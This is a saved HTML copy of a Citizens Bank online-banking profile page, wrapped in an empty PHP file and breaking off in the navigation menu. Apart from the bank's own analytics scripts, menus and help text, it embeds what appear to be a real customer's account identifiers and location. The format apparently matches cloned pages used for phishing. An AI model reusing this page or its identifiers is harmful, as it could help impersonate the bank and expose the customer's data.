<?php

?>


<html lang="en-US" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths citizens-Chrome citizens-user-consumer">
<head class="at-element-marker">
    <script type="text/javascript" async="async" src="https://smetrics.citizensbank.com/b/ss/citizensbankdotcomprod/10/JS-2.5.0/s78279251034026?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=12%2F1%2F2021%2017%3A4%3A18%205%20300&amp;cid.&amp;citizensbankid.&amp;id=D%3Dv55&amp;as=1&amp;.citizensbankid&amp;citizenscis.&amp;id=D%3Dv33&amp;as=1&amp;.citizenscis&amp;.cid&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;sdid=3CC2EE268DAA35BF-25425D80246714A0&amp;mid=59858266344980654540973610094511976378&amp;aamlh=7&amp;ce=UTF-8&amp;ns=citizensbank&amp;g=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Fmyprofile.jsp&amp;r=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Fmyprofile-wait.jsp&amp;cc=USD&amp;aamb=j8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI&amp;c3=D%3Dv51&amp;v4=loggedIn&amp;c5=D%3Dv8&amp;v7=Repeat&amp;c8=loggedIn%3ALegacy%3AMy%20Profile&amp;v8=5%3A04%20PM%7CFriday&amp;c9=D%3Dv7&amp;c11=D%3Dv11&amp;v11=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Fmyprofile.jsp&amp;c12=D%3Dv12&amp;v12=%2Fefs%2Fservlet%2Fefsonline%2Fmyprofile.jsp&amp;c13=D%3Dv13&amp;v13=www3.citizensbankonline.com&amp;v18=OLB&amp;v19=OLB%3AAuthenticated&amp;v32=59858266344980654540973610094511976378&amp;c33=D%3Dv33&amp;v33=29422251&amp;v51=no%20value&amp;c55=D%3Dv55&amp;v55=96384329&amp;c75=VisitorAPI%20Present&amp;c.&amp;a.&amp;activitymap.&amp;page=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Findex.jsp&amp;link=Challenge%20Questions&amp;region=main-container&amp;.activitymap&amp;.a&amp;.c&amp;pid=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Findex.jsp&amp;oid=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Fmyprofile-wait.jsp&amp;ot=A&amp;s=2560x1440&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1806&amp;bh=928&amp;mcorgid=4C3B0C3755C3822E7F000101%40AdobeOrg&amp;AQE=1"></script>
    <script type="text/javascript" async="" src="https://nexus.ensighten.com/citizensbank/olbprod/code/bbb1b3511728db12bd3511c6ba5dea78.js?conditionId0=4842182"></script>
    <script type="text/javascript" async="" src="https://nexus.ensighten.com/citizensbank/olbprod/code/ad3f185e5382717d72532bbe755d51cf.js?conditionId0=421909"></script>
    <script src="https://nexus.ensighten.com/citizensbank/olbprod/serverComponent.php?r=3876.7823417929303&amp;namespace=Bootstrapper&amp;staticJsPath=nexus.ensighten.com/citizensbank/olbprod/code/&amp;publishedOn=Wed Jan 13 06:10:31 GMT 2021&amp;ClientID=397&amp;PageID=https%3A%2F%2Fwww3.citizensbankonline.com%2Fefs%2Fservlet%2Fefsonline%2Fmyprofile.jsp"></script>
    <iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe>
    <script>
        function submitForm() {
            document.frmEditUser.submit();
        }

        function changeImage() {
            document.frmEditUser.action="/efs/servlet/efsonline/security-change-image.jsp";
            document.frmEditUser.submit();
        }

        /* function submitChangeAddressForm() {
            document.getElementById('addressLinkClicked').value = 'true';
            document.frmEditUser.submit();
        } */

    </script>
    <script>
        function isNumeric(aCharacter) {
            return (aCharacter >= '0') && (aCharacter <= '9')
        }

        function isLowerCase(aCharacter) {
            return (aCharacter >= 'a') && (aCharacter <= 'z')
        }

        function isUpperCase(aCharacter) {
            return (aCharacter >= 'A') && (aCharacter <= 'Z')
        }

        function lowerCaseChars ( pswd ) {
            count = 0;
            for (var i=0; i
            <pswd.length; i++) {
                if ( isLowerCase ( pswd.charAt(i) ) ) {
                    count++;
                }
            }
            return count;
        }

        function upperCaseChars ( pswd ) {
            count = 0;
            for (var i=0; i
            <pswd.length; i++) {
                if ( isUpperCase (  pswd.charAt(i) ) ) {
                    count++;
                }
            }
            return count;
        }

        function numericChars ( pswd ) {
            count = 0;
            for (var i=0; i
            <pswd.length; i++) {
                if ( isNumeric (  pswd.charAt(i) ) ) {
                    count++;
                }
            }
            return count;
        }


    </script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Online Banking | Citizens Bank</title>
    <!--Include javascript library for dialog modal-->
    <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jquery/ui110/css/ui-lightness/jquery-ui-1.10.3.custom.min.css">
    <script src="https://www3.citizensbankonline.com/efs/efs/jquery/js/jquery.min.js"></script>
    <script src="https://www3.citizensbankonline.com/efs/efs/jquery/ui110/js/jquery-ui-1.10.3.custom.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/efs/multilang/FFretail_common.css">
    <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/efs/css/secure-styles-2013.css">
    <!--Including ensighten library part of head.-->
    <!-- ensighten.jsp -->
    <script type="text/javascript">
        var timeStamp = new Date().toString();
        var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
        var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
        var screenWidth = screen.width;
        var device, myPosition;
        if (screenWidth < 768) {
            device = "mobi";
        } else if (screenWidth >= 768 && screenWidth <= 1024) {
            device = "tablet";
        } else {
            device = "desk";
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            }
        }
        function showPosition(position) {
            myPosition = position.coords.latitude + "," + position.coords.longitude;
        }
        getLocation();

        function getCookieValue(cookieName) {
            function escape(s) { return s.replace(/([.*+?\^$(){}|\[\]\/\\])/g, '\\$1'); }
            var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(cookieName) + '=([^;]*)'));
            return match ? match[1] : null;
        }
        var sessionId = getCookieValue("OLBJSESSIONID");

        var userCisKey = "29422251";
        var userDirectoryId = "96384329";
        var userType = "2";
        var isGeminiUser = "";
        // User type mapped to "cbtype" for analytics
        var cbType = "generic";
        if (isGeminiUser === "true")
            cbType = "gemini";
        else if (userType === "1")
            cbType = "business";
        else if (userType === "2")
            cbType = "consumer";

        // Standard digitalData object for legacy analytics
        var digitalData = {
            "sessionInformation": {
                "zipCode": "02871-1520",
                "country": "USA",
                "city": "PORTSMOUTH",
                "state": "RI",
                "timeStamp": timeStamp
            },
            "customerAttributes": {
                "CISKey": userCisKey,
                "DirectoryID": userDirectoryId
            },
            "contentInteractions": {
                "siteName": "OLB",
                "siteSection": "Authenticated",
                "pageName": pageName,
                "pageURL": pageURL,
                "pageType": "Legacy"
            }
        };

        function triggerEnsightenEvent(eventName) {
            if (typeof (Bootstrapper) !== "undefined" && Bootstrapper.ensEvent && Bootstrapper.ensEvent.trigger) {
                console.debug("Bootstrapper found, triggering event " + eventName);
                Bootstrapper.ensEvent.trigger(eventName);
            }
            else {
                console.warn("Bootstrapper not found to trigger event " + eventName);
            }
        }

    </script>
    <script type="text/javascript">
        // Trigger page event after Ensighten Bootstrap script loaded
        if (window.frames && window.frames.length)
            triggerEnsightenEvent("OLBURLChangeFrame");
        else
            triggerEnsightenEvent("OLBURLChangeWindow");
    </script>
    <!-- BEGIN LivePerson Monitor -->
    <!-- END LivePerson Monitor -->
    <style>
        table.main-contents tr td {
            vertical-align: top;
            padding : 2px 4px;
        }

        table.SecurtyInfo tr td:first-child {
            padding-top : 10px;
        }

        /*table.main-contents tr td:first-child {
            padding-top : 7px;
        }*/

        label.lbl {
            display : inline;
            margin-top : 5px;
        }

        label.lbl + span {
            position: relative;
            top: 5px;
        }

        table.pswdindicatorborder tr td:first-child {
            padding : 0px;
        }

        table.pswdindicatorborder tr td#idWeak {
            padding-top : 2px;
        }

        label {
            text-align: right;
            width: 35%;
            float : left;
            margin-top : 3px;
            margin-right : 15px;
            display : inline-block;
            font-weight: normal !important;
        }

        select {
            width: 450px !important;
            max-width: 450px !important;
            padding : 4px !important;
            overflow: hidden !important;
            display : inline !important;
        }

        .security-instructions{
            padding-top: 10px;
        }

    </style>
    <!--Scripts for invoking confirmation message modal-->
    <script>
        var $j = jQuery.noConflict();
        $j(document).ready(function() {
            // Events listeners
            $j('input[name="RememberOnlineUserId"]:radio,input[name="RememberMe"]:radio').change(function(e){
                var id = "#dialog-" + e.currentTarget.name + "-" + ((e.currentTarget.value === "true")?"on":"off");
                invokeDialog(id);
                $j(id).dialog('open');
            });
            function invokeDialog(id){
                $j(id).dialog({
                    modal: true,
                    autoOpen: false,
                    minHeight : 100,
                    minWidth : 550,
                    resizable: false,
                    draggable: false,
                    buttons: [
                        {
                            text: "OK",
                            id: "continue-d-btn",
                            click: function () {
                                $j('#continue-d-btn').siblings().remove();
                                $j(id).dialog("close");
                            }
                        }
                    ]
                });
            };
        });
    </script>

    <script src="https://www3.citizensbankonline.com/efs/adobe-target/js/at-1.5.js"></script>
    <style id="at-makers-style" class="at-flicker-control">
        .mboxDefault {visibility:hidden;}
    </style>
    <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
</head>
<body>
<div class="olbcontainer">
    <script type="text/javascript" src="https://www3.citizensbankonline.com/efs/efs/js/tealeaf.js"></script>
    <!-- begin CITIZENS BANK Hosted Header -->
    <div class="citizens-header-footer-injected">
        <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/hhf/css/libs.min.44583.css">
        <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/hhf/css/main.min.44583.css">
        <style>.page-header .centered-content{width: auto;}</style>
        <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/hhf/css/hhf.min.44583.css">
        <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/hhf/css/citizens.min.44583.css">
        <!--[if IE 8]>
        <link rel="stylesheet" type="text/css" href="https://www3.citizensbankonline.com/efs/hhf/css/citizens-ie8.min.44583.css?refresh=1613167456737">
        <![endif]-->
        <style>
            .help-modal-header .help-modal-close {background: url(/efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
            .help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
            .account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
            .lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
            .input-wrapper .tooltip {margin-left: 1px;}
        </style>
        <div class="citizens-header-footer">
            <div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;">
                <p>You will be logged out of Citizens Bank Online® in

                    <span id="timeout-seconds">30</span> seconds and will lose any unsaved changes.
                </p>
                <p>
                    <strong>Do you wish to continue banking?</strong>
                </p>
                <a href="#" class="button button-cta button-continue">
                    <span>CONTINUE</span>
                </a>
                <a href="#" class="button button-cta button-logout">LOG OUT</a>
            </div>
            <div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;">
                <div class="help-modal-container clearfix">
                    <div class="help-modal-sidebar">
                        <div class="help-modal-header help-modal-header-mobile">
                            <h3>Help</h3>
                            <a href="" class="help-modal-close help-modal-close-modal modalCloseImg"></a>
                        </div>
                        <nav id="help-modal-menu" class="help-modal-menu">
                            <ul>
                                <li>
                                    <a href="#help-globalhelp" class="help-modal-nav-more">
                                        <span>ONLINE BANKING NAVIGATION</span>
                                    </a>
                                    <ul class="help-modal-nav-submenu"></ul>
                                </li>
                                <li class="active-menu">
                                    <a href="#help-myaccounts" class="help-modal-nav-more">
                                        <span>MY ACCOUNTS</span>
                                    </a>
                                    <ul class="help-modal-nav-submenu" style="display: block;">
                                        <li>
                                            <a href="#help-myaccounts-opennewaccounts">Open New Accounts</a>
                                        </li>
                                        <li>
                                            <a href="#help-myaccounts-myprofile" class="active">My Profile</a>
                                        </li>
                                        <li>
                                            <a href="#help-myaccounts-alertscenter">Alerts Center</a>
                                        </li>
                                        <li>
                                            <a href="#help-myaccounts-messagecenter">Message Center</a>
                                        </li>
                                        <li>
                                            <a href="#help-myaccounts-accountpreferences">Account Preferences</a>
                                        </li>
                                        <li>
                                            <a href="#help-myaccounts-accountoptions">Bank Account Options</a>
                                        </li>
                                        <li>
                                            <a href="#help-myaccounts-transactiondownload">Download Transactions</a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="#help-transfermoney" class="help-modal-nav-more">
                                        <span>TRANSFER MONEY</span>
                                    </a>
                                    <ul class="help-modal-nav-submenu">
                                        <li>
                                            <a href="#help-transfermoney-transfersbetweencitizensaccounts">Transfers Between Citizens Accounts</a>
                                        </li>
                                        <li>
                                            <a href="#help-transfermoney-manageothercitizensaccounts">Manage Other Citizens Accounts</a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="#help-paybillsandpeople" class="help-modal-nav-more">
                                        <span>PAY BILLS &amp; PEOPLE</span>
                                    </a>
                                    <ul class="help-modal-nav-submenu"></ul>
                                </li>
                                <li>
                                    <a href="#help-documentcenter" class="help-modal-nav-more">
                                        <span>DOCUMENT CENTER</span>
                                    </a>
                                    <ul class="help-modal-nav-submenu"></ul>
                                </li>
                                <li>
                                    <a href="#help-servicecenter" class="help-modal-nav-more">
                                        <span>SERVICE CENTER</span>
                                    </a>
                                    <ul class="help-modal-nav-submenu">
                                        <li>
                                            <a href="#help-servicecenter-reorderchecks">Reorder Checks</a>
                                        </li>
                                    </ul>
                                </li>
                            </ul>
                        </nav>
                    </div>
                    <div id="help-modal-main" class="help-modal-main">
                        <div class="help-modal-header help-modal-header-desktop ui-draggable-handle">
                            <h3>Online Banking Help</h3>
                            <a href="" class="help-modal-close modalCloseImg"></a>
                        </div>
                        <div class="help-modal-header help-modal-header-mobile">
                            <a href="" class="help-modal-open-nav mobile-nav">
                                <div></div>
                                <div></div>
                                <div></div>
                            </a>
                            <h3>Help</h3>
                            <a href="" class="help-modal-close help-modal-close-modal modalCloseImg"></a>
                        </div>
                        <div class="help-modal-content">
                            <img src="https://www3.citizensbankonline.com/efs/hhf/img/ajax-loader.gif" alt="loading content" style="display: none;">
                            <div class="help-modal-section active" id="help-myaccounts-myprofile-content">
                                <h2>Confirm Profile Information</h2>
                                <p>The "My Profile" page allows you to easily view, access, and manage your Online Banking preferences, including:</p>
                                <ul>
                                    <li>
                                        <a href="#helpcontent-myaccounts-myprofile-personalinformation">Personal Information </a>
                                    </li>
                                    <li>
                                        <a href="#helpcontent-myaccounts-myprofile-onlineidandpassword">Online User ID &amp; Password </a>
                                    </li>
                                    <li>
                                        <a href="#helpcontent-myaccounts-myprofile-securitysettings">Security Settings </a>
                                    </li>
                                </ul>
                                <p>You can easily access My Profile by clicking on the “edit My Profile” link from the “MY ACCOUNTS” page.</p>
                                <h3 id="helpcontent-myaccounts-myprofile-personalinformation">Personal Information</h3>
                                <p>To ensure you receive up-to-date information about your banking, be sure to update your personal information. You can change your physical street address and add a separate mailing address for receiving account documents and cards.</p>
                                <ul>
                                    <li>
                                        <strong>To change your physical address: </strong>
                                        <ol>
                                            <li>Click on the "Change Address" link under your current Address in your Profile.</li>
                                            <li>From the "Change Address" page, click the "CHANGE PHYSICAL ADDRESS" button. </li>
                                            <li>From the "Change Physical Address" page, enter the address details. Note: The physical address must be a street address NOT a Post Office Box.</li>
                                            <li>Check the accounts for which you would like your physical address to be your mailing address for receiving account documents and statements. </li>
                                            <li>Click the "SUBMIT ADDRESS" button.</li>
                                        </ol>
                                    </li>
                                    <li>
                                        <strong>To change your mailing address:</strong>
                                        <ol>
                                            <li>Click on the "Change Address" link under your current Address in your profile. </li>
                                            <li>From the "Address Change" page, click the "ADD MAILING ADDRESS" button. </li>
                                            <li>From the “Add Mailing Address” page, enter the address details. If you wish for your mailing address to be a seasonal address for a set period of time, such as an extended vacation, choose the "From" and "To" dates for when you want the mailing address to be in effect.</li>
                                            <li>Check the accounts you want associated with this mailing address for receiving account documents and statements. </li>
                                            <li>Click the “SUBMIT ADDRESS" button.</li>
                                        </ol>
                                    </li>
                                </ul>
                                <p>In both cases, please allow 3-5 business days for the address changes to take effect.</p>
                                <p>Once you have modified your personal information, click 'Save' to proceed with saving this information.</p>
                                <h3 id="helpcontent-myaccounts-myprofile-onlineidandpassword">Online User ID &amp; Password</h3>
                                <p>Your Online User ID and Password are designed to help maintain the security of your Online Banking account. We recommend you update your Password periodically.</p>
                                <ul>
                                    <li>
                                        <strong>To change your Online User ID:
                                            <br>
                                        </strong>Enter your new Online User ID in the field where your current User ID is displayed. Your Online User ID must be between 5 - 20 characters and cannot be already taken by another Online Banking customer.
                                    </li>
                                    <li>
                                        <strong>To change your Password: </strong>
                                        <ol style="margin-left:-9px;">
                                            <li>Enter your Current Password. You will be asked to create and confirm a New Password. Your Password must meet all of the following requirements:
                                                <br>-&nbsp;&nbsp;&nbsp;&nbsp;Must contain 8 to 15 characters
                                                <br>-&nbsp;&nbsp;&nbsp;&nbsp;Must include one letter and one number
                                                <br>-&nbsp;&nbsp;&nbsp;&nbsp;Must be different from your Online User ID
                                                <br>-&nbsp;&nbsp;&nbsp;&nbsp;Must be different from your previous Password&nbsp;
                                                <br>
                                                <br>
                                                <strong>Password tips</strong>: Select a Password that consists of uppercase and lowercase letters, numbers, or a combination of case sensitive letters and numbers, which would not be found in a dictionary or be easily guessed by others. Note that Passwords are case sensitive.
                                            </li>
                                            <li>Once you have modified your Online User ID and/or Password, click the "SAVE" button to proceed with saving this information.</li>
                                        </ol>
                                    </li>
                                </ul>
                                <h3 id="helpcontent-myaccounts-myprofile-securitysettings">Security Settings</h3>
                                <p>You can change your Online Banking security information, including the Challenge Questions you selected, or your Challenge Question answers. When you modify your Challenge Questions, you can change the answers only, or change both the questions and the answers. All three Challenge Questions are mandatory and must be unique; you cannot repeat the same question even if you provide different answers for each instance. Once you have modified your security information, click the "SAVE" button to proceed with saving this information.</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
                <div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
                <div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
            </div>
        </div>
    </div>
    <div class="citizens-header">
        <!-- overlay to hide elements until CSS is loaded -->
        <style>
            .citizens-header-footer-overlay{ opacity:1; background-color:#fff; position:fixed; width:100%; height:100%; top:0px; left:0px; z-index:1000; }
            .citizens-header-footer-overlay .centered-content { width: 100%; max-width: 1060px; padding: 0 20px; margin: 0 auto; font-family: arial, helvetica, san-serif; font-size: 14px;}
            .citizens-header-footer-overlay .responsive-enabled .centered-content { width: auto; max-width: 1060px; }
            .citizens-header-footer-overlay .page-logo { float: none; }
            .citizens-header-footer-overlay .page-logo img{ margin: 10px; float: none;}
            .citizens-header-footer-overlay .topshadow {
                position: absolute; width: 100%; top: 100px; z-index: 5; height: 8px;
                background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%); background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%); background-repeat: no-repeat; background-size: cover;
            }
        </style>
        <!-- end overlay -->
        <style>
            .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
            .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
        </style>
        <!-- htmlContainer PREFIX -->
        <div class="citizens-header-footer">
            <div id="page-header" class="page-header">
                <!-- inc-header.html START -->
                <div class="topshadow"></div>
                <div class="centered-content clearfix">
                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#myaccounts" class="page-logo">
                        <img border="0" alt="Citizens Bank" width="203" height="25" src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png">
                    </a>
                    <div id="header-navigation-container" style="display: inline;">
                        <a class="visuallyhidden js-skipnavigation" tabindex="0">Skip Navigation</a>
                        <nav class="util-nav">
                            <ul>
                                <li>
                                    <a href="#" title="Opens HELP Dialog" class="help-modal-open">Help
                                        <span class="visuallyhidden">- Opens HELP Dialog </span>
                                    </a>
                                </li>
                                <!--
<li><a href="#" class="js-print-link">Print</a></li>
-->
                                <li class="last">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efs/logout.jsp" class="logout-link js-logout-link last">
                                        <span class="account-underline">Log Out</span>
                                    </a>
                                </li>
                            </ul>
                        </nav>
                        <nav class="page-nav">
                            <div class="mobile-nav">
                                <div></div>
                                <div></div>
                                <div></div>
                                <span>11</span>
                            </div>
                            <ul>
                                <li class="haslogo">
                                    <a href="#">
                                        <!-- <svg width="200" height="43"><image xlink:href="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Rev.svg" src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_White_RO-01.png" width="200" height="43" ></image></svg>-->
                                        <img src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_White_RO-01.png" alt="Citizens Bank" width="203" height="25">
                                    </a>
                                </li>
                                <li class="hasSalutation">
                                    <div class="notifications">
                                        <h6 class="notification-name">
                                            <span class="greeting">Welcome,</span>
                                        </h6>
                                        <time class="notification-last-login" datetime="">Last logged in on Invalid date at Invalid date.</time>
                                        <a class="edit-profile" href="https://www3.citizensbankonline.com/efs/servlet/efsonline/wait.jsp?target=myprofile-wait.jsp">Edit My Profile</a>
                                    </div>
                                </li>
                                <!-- ------- My Accounts ------- -->
                                <li class="nav-myaccounts" tabindex="0">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#myaccounts" class="active">My Accounts</a>
                                    <div class="sub-nav-container sub-nav-myaccounts">
                                        <div class="sub-nav clearfix">
                                            <div class="sub-nav-col">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#newaccount">Open New Accounts</a>
                                            </div>
                                            <div class="sub-nav-col">
                                                <a class="notification-msg-mobile" href="https://www3.citizensbankonline.com/efs/servlet/efsonline/wait.jsp?target=alerts-wait.jsp">Alerts
                                                    <span class="mobile-alert-dot alert-count">11</span>
                                                </a>
                                                <ul>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/alerts2013/alerts-managealerts.jsp" id="manage-alerts">Manage Alerts</a>
                                                    </li>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/alerts2013/alerts-contact-points.jsp?ClearContactList=true">My Alert Addresses</a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div class="sub-nav-col">
                                                <a class="notification-alert-mobile" href="https://www3.citizensbankonline.com/efs/servlet/efsonline/wait.jsp?target=messages-wait.jsp">Messages </a>
                                                <ul>
                                                    <!--                            <li><a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/messages-create.jsp?newMessage=TRUE">Send Message</a></li>-->
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/wait.jsp?target=messages-sent.jsp">View Sent Messages</a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div class="sub-nav-col">
                                                <ul>
                                                    <!--permission check REF:88-->
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/overdraft/standard-overdraft-practices.jsp">Overdraft Choices</a>
                                                    </li>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/online-statements.jsp">Statement Preferences</a>
                                                    </li>
                                                    <!-- Def# 1463 - Not to show plans for any user. permission check REF:90
<li><a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/plans/index.jsp" id="plans">Plans</a></li>
-->
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                                <!--permission check REF:93-->
                                <!-- ------- Transfer Money ------- -->
                                <li class="nav-transfers" tabindex="0">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#transfers">Transfer Money</a>
                                    <div class="sub-nav-container">
                                        <div class="sub-nav wide-cols clearfix">
                                            <!--permission check REF:94,95-->
                                            <div class="sub-nav-col">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#transfers">Transfer Between Citizens Accounts</a>
                                                <ul>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/transfers/manage-other-wait.jsp">Manage Other Citizens Accounts</a>
                                                    </li>
                                                </ul>
                                            </div>
                                            <!--permission check REF:96,97,98-->
                                            <div class="sub-nav-col extra-big">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/cashedgeredirect.jsp?landingPage=CEMakeTransfer&amp;ceproduct=TN&amp;UID_TOKEN=https%3A%2F%2Fwww3.citizensbankonline.com%7CCONSUMER%7CNONE%7C02871-1520%7C4661%7Ccitizensbank%7C1ffa%7CNONE%7C3ff%7C0%7C11%7Ctransfer" id="transfer-between-other-accounts">Transfer Between My Other Bank Accounts</a>
                                                <ul>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/cashedgeredirect.jsp?landingPage=CEAddAccounts&amp;ceproduct=TN&amp;UID_TOKEN=https%3A%2F%2Fwww3.citizensbankonline.com%7CCONSUMER%7CNONE%7C02871-1520%7C4661%7Ccitizensbank%7C1ffa%7CNONE%7C3ff%7C0%7C11%7Ctransfer" id="manage-other-accounts">Manage Other Bank Accounts</a>
                                                    </li>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/cashedgeredirect.jsp?landingPage=CEActivity&amp;ceproduct=TN&amp;UID_TOKEN=https%3A%2F%2Fwww3.citizensbankonline.com%7CCONSUMER%7CNONE%7C02871-1520%7C4661%7Ccitizensbank%7C1ffa%7CNONE%7C3ff%7C0%7C11%7Ctransfer" id="transfer-activity">Activity</a>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                                <!--permission check REF:131-->
                                <!-- ------- Pay Bills &amp; People ------- -->
                                <!-- Delegate permission check -> if user has either paybill/popmoney permission-->
                                <!-- -->
                                <li class="nav-paybills" tabindex="0">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#payments">Pay Bills &amp; People</a>
                                    <div class="sub-nav-container">
                                        <div class="sub-nav clearfix">
                                            <!--Below links are disabled for view only cutomers-->
                                            <!--permission check REF:136-->
                                            <!--Show only delegate user got bill pay permission -->
                                            <div class="sub-nav-col">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/payments/payments-wait.jsp?1=1&amp;UID_TOKEN=https%3A%2F%2Fwww3.citizensbankonline.com%7CCONSUMER%7CNONE%7C02871-1520%7C4661%7Ccitizensbank%7C1ffa%7CNONE%7C3ff%7C0%7C11" id="pay-bills">Pay Bills</a>
                                                <!-- <ul><li><a href="paybills-billhistory.php">Bill History</a></li><li><a href="paybills-managebillers.php">Manage Billers</a></li><li><a href="paybills-billpay_alerts.php">Bill Pay Alerts</a></li></ul> -->
                                            </div>
                                            <div class="sub-nav-col">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#send-money-with-zelle" id="send-money">Send Money with
                                                    <img src="https://www3.citizensbankonline.com/efs/hhf/img/logo-zelle-small.png" alt="Zelle" class="sub-nav-logo">
                                                </a>
                                            </div>
                                            <div class="sub-nav-col last"></div>
                                        </div>
                                    </div>
                                </li>
                                <!---->
                                <!-- ------- Document Center ------- -->
                                <li class="nav-documents" tabindex="0">
                                    <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/timeframeonemonth" id="nav-DocumentCenter">Document Center</a>
                                    <div class="sub-nav-container">
                                        <div class="sub-nav wide-cols clearfix">
                                            <div class="sub-nav-col">
                                                <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/pagetypeaccounts/timeframeonemonth" id="account-documents">Account Documents</a>
                                                <ul>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/pagetypeaccounts/doctypestatement/timeframethreemonth" id="statement">Statements</a>
                                                    </li>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/pagetypeaccounts/doctypeenotice/timeframethreemonth" id="enotices">eNotices</a>
                                                    </li>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/pagetypeaccounts/doctypecheck/timeframetwomonth" id="checkimages">Check Images</a>
                                                    </li>
                                                    <li>
                                                        <a href="https://www3.citizensbankonline.com/efs/servlet/efsonline/index.jsp#documents/pagetypeaccounts/doctypetaxdoc/timeframeyear" id="taxdocs">Tax Forms</a>
                                                    </li>
                                                </ul>
                                            </div>
